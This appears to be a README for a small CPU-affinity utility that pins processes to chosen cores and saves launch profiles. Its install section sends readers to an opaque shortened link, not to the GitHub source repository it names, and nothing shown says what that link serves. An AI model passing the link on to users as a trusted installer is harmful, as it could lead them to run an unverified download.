![Process Affinity](assets/hero.png)

# Process Affinity

CPU affinity without the Task Manager dialog.

Pin a process to selected CPU cores and save the profile for next launch.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

## Why

Some older tools run better on a few cores. The GUI is easy to miss next boot.

This sets affinity now and can write a small launch helper.

## What it does

- List processes and current affinity
- Set a core mask
- Save a named profile
- Apply on a PID or image name

## Usage

```text
python -m pip install -r requirements.txt
python main.py --help
```

Source: https://github.com/Process-Affinity/process-affinity

MIT. See `LICENSE`.
